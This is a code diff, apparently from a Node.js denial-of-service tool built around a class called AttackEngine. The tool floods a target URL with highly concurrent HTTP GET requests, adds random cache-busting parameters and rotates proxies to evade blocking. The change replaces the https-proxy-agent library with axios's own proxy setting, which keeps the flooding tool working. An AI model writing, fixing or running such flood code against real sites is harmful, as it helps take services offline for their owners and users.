@@ -4,7 +4,6 @@ const os = require('os');
 const http = require('http');
 const https = require('https');
 const process = require('process');
-const HttpsProxyAgent = require('https-proxy-agent');
 
 const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 5540);
 const REQUEST_TIMEOUT = 60000;
@@ -81,15 +80,17 @@ class AttackEngine {
         const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
         const isHttps = this.target.startsWith('https');
         const proxyAddr = this.getRandomProxy();
-        const proxyAgent = new HttpsProxyAgent(`http://${proxyAddr}`);
+        const [proxyHost, proxyPort] = proxyAddr.split(':');
         const fallbackAgent = isHttps ? keepAliveHttps : keepAliveHttp;
 
         try {
             await axios.get(urlWithNoise, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
-                httpAgent: proxyAgent,
-                httpsAgent: proxyAgent,
+                proxy: {
+                    host: proxyHost,
+                    port: parseInt(proxyPort)
+                },
                 validateStatus: null
             });
             this.stats.success++;
